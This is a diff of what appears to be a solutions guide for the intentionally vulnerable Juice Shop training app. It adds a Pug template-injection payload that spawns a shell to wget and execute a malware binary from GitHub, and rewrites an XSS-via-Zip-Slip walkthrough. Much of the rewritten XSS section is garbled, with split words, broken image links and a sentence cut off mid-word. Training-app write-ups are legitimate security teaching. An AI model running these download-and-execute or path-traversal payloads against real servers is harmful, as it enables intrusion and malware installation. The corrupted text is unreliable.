@@ -2269,74 +2269,107 @@ to use some unofficial port._
 
 🔧 **TODO**
 
-###  Infect the server with malware by abusing arbitrary command execution
+###  Infect the server with juicy malware by abusing arbitrary command execution
 
-🔧 **TODO**
+1. Perform the totally obvious Google search for `juicy malware` to find
+   <https://github.com/J12934/juicy-malware>
+2. Alternatively you also find three `.url` files with direct links in
+   <http://localhost:3000/ftp/quarantine> but you'll probably need to
+   understand how to solve any of
+   [Access a developer's forgotten backup file](#access-a-developers-forgotten-backup-file),
+   [Access a salesman's forgotten backup file](#access-a-salesmans-forgotten-backup-file)
+   or
+   [Access a misplaced SIEM signature file](#access-a-misplaced-siem-signature-file)
+   first.
+3. Your goal is to use RCE to make the server download and execute the
+   malware version for the server OS, so on Linux you might want to run
+   something like `wget -O malware
+   https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true
+   && chmod +x malware && ./malware`
+4. You probably realized by now that <http://localhost:3000/profile> is
+   not an Angular page? This page is written using
+   [Pug](https://pugjs.org) which happens to be a Template engine and
+   therefore perfectly suited for SSTi mischief.
+5. Set your _Username_ to `1+1` and click _Set Username_. Your username
+   will be just shown as `1+1` under the profile picture.
+6. Trying template injection into Pug set _Username_ to `#{1+1}` and
+   click _Set Username_. Your username will now be shown as `2` under
+   the profile picture!
+7. Craft a payload that will abuse the lack of encapsulation of
+   JavaScript's `global.process` object to dynamically load a library
+   that will allow you to spawn a process on the server that will then
+   download and execute the malware.
+8. The payload might look like
+   `#{global.process.mainModule.require('child_process').exec('wget -O
+   malware
+   https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true
+   && chmod +x malware && ./malware')}`. Submit this as _Username_ and
+   (on a Linux server) the challenge should be marked as solved
+
+ℹ️ Remember that you need to use the right malware file for your
+server's operation system and also their synonym command for `wget`.
 
 ### Embed an XSS payload into our promo video
 
-1. The author
-   [tweeted about a new promotion video](https://twitter.com/bkimminich/status/1114621693299916800)
-   from his personal account, openly spoilering the URL
-   <http://juice-shop-staging.herokuapp.com/promotion>
+r p romo video 1. The author
+[tweeted about a new promotion video](https://twitter.com/bkimminich/status/1114621693299916800)
+from his personal account, openly spoilering the URL
+<http://juice-shop-staging.herokuapp.
 
-   ![Tweet promoting a new in-app promotion video](img/tweet_promotion.png)
-2. Visit <http://localhost:3000/promotion> to watch the video. You will
-   notice that it comes with subtitles enabled by default.
+    <http://juice-shop-staging.herokuapp.com/promotion>
+       ![Tweet promoting a new in-app promotion video](img/tweet
+    _
 
-   ![In-app promotion video](img/promo_video.png)
-3. Right-click and select _View Source_ on the page to learn that it
-   loads its video from <http://localhost:3000/video> and that the
-   subtitles are directly embedded in the page itself.
-4. Inspecting the response for <http://localhost:3000/video> in the
-   _Network_ tab of your DevTools shows an interesting header
-   `Content-Location: /assets/public/videos/JuiceShopJingle.mp4`
-5. Trying to access the video directly at
-   <http://localhost:3000/assets/public/videos/JuiceShopJingle.mp4>
-   works fine.
-6. Getting a directory listing for
-   <http://localhost:3000/assets/public/videos> does not work
-   unfortunately.
-7. Knowing that the subtitles are in
-   [WebVTT](https://www.w3.org/TR/webvtt1/) format (from step 3) a lucky
-   guess would be that a corresponding `.vtt` file is available
-   alongside the video.
-8. Accessing
-   <http://localhost:3000/assets/public/videos/JuiceShopJingle.vtt>
-   proves this assumption correct.
-9. As the subtitles are not loaded separately by the client, they must
-   be embedded on the server side. If this embedding happens without
-   proper safeguards, an XSS attack would be possible if the subtitles
-   files could be overwritten.
-10. The prescribed XSS payload also hints clearly at the intended attack
-    against the subtitles, which are themselves enclosed in a `<script>`
-    tag, which the payload will try to close prematurely with its
-    starting `</script>`.
-11. To successfully overwrite the file, the Zip Slip vulnerability
-    behind the
-    [Overwrite the Legal Information file](#overwrite-the-legal-information-file)
-    challenge can be used.
-12. The blind part of this challenge is the actual file location in the
-    server file system. Trying to create a Zip file with any path trying
-    to traverse into `../../assets/public/videos/` will fail. Notice
-    that `../../` was sufficient to get to the root folder in
-    [Overwrite the Legal Information file](#overwrite-the-legal-information-file).
-13. This likely means that there is a deeper directory structure in
-    which `assets/` resides.
-14. This actual directory structure on the server is created by the
-    AngularCLI tool when it compiles the application and looks as
-    follows: `frontend/dist/frontend/assets/`.
-15. Prepare a ZIP file with a `JuiceShopJingle.vtt` inside that contains
-    the prescribed payload of ``</script><script>alert(`xss`)</script>``
-    with `zip exploit.zip
-    ../../frontend/dist/frontend/assets/public/video/JuiceShopJingle.vtt`
-    (on Linux).
-16. Upload the ZIP file on <http://localhost:3000/#/complain>.
-17. The challenge notification will not trigger immediately, as it
-    requires you to actually execute the payload by visiting
-    <http://localhost:3000/promotion> again.
-18. You will see the alert box and once you go _Back_ the challenge
-    solution should trigger accordingly.
+pro motion.png) 2. Visit <http://localhost:3000/promotion> to watch the
+video. You will notice that it comes with subtitles enabl
+
+    notice that it comes with subtitles enabled by default.
+       ![In-app promotion video](img/p
+    r
+
+omo _video.png) 3. Right-click and select _View Source_ on the page to
+learn that it loads its video from <http://localhost:3000/video> and
+that the subtitles are directly embedded in th e p age itself. 4.
+Inspecting the response for <http://localhost:3000/video> in the
+_Network_ tab of your DevTools shows an interesting header
+`Content-Location: /assets/public/videos/JuiceS hop Jingle.mp4` 5.
+Trying to access the video directly at
+<http://localhost:3000/assets/public/videos/JuiceShopJingle.mp4> works
+fine. 6. Getting a directory listing for
+<http://localhost:3000/assets/public/videos> does not work unf
+ortunately. 7. Knowing that the subtitles are in
+[WebVTT](https://www.w3.org/TR/webvtt1/) format (from step 3) a lucky
+guess would be that a corresponding `.vtt` file is available alongs ide
+the video. 8. Accessing
+<http://localhost:3000/assets/public/videos/JuiceShopJingle.vtt> proves
+this assum pti on correct. 9. As the subtitles are not loaded separately
+by the client, they must be embedded on the server side. If this
+embedding happens without proper safeguards, an XSS attack would be
+possible if the subtitles files could b e ov erwritten. 10. The
+prescribed XSS payload also hints clearly at the intended attack against
+the subtitles, which are themselves enclosed in a `<script>` tag, which
+the payload will try to close prematurely with its startin g `<
+/script>`. 11. To successfully overwrite the file, the Zip Slip
+vulnerability behind the
+[Overwrite the Legal Information file](#overwrite-the-legal-information-file)
+challeng e ca n be used. 12. The blind part of this challenge is the
+actual file location in the server file system. Trying to create a Zip
+file with any path trying to traverse into `../../assets/public/videos/`
+will fail. Notice that `../../` was sufficient to get to the root folder
+in [Overwrite the Legal Information file](#overwrite-the-legal-info rmat
+ion-file). 13. This likely means that there is a deeper directory
+structure in which `ass ets/ ` resides. 14. This actual directory
+structure on the server is created by the AngularCLI tool when it
+compiles the application and looks as follows: `frontend/dist/fron tend
+/assets/`. 15. Prepare a ZIP file with a `JuiceShopJingle.vtt` inside
+that contains the prescribed payload of
+``</script><script>alert(`xss`)</script>`` with `zip exploit.zip
+../../frontend/dist/frontend/assets/public/video/JuiceShopJingle.vtt` (
+on Linux). 16. Upload the ZIP file on <http://localhost:300 0/#/
+complain>. 17. The challenge notification will not trigger immediately,
+as it requires you to actually execute the payload by visiting
+<http://localhost:3000/pro moti on> again. 18. You will see the alert
+box and once you go _Back_ the challenge solution should trigge
 
 [^1]: <https://en.wikipedia.org/wiki/ROT13>
 
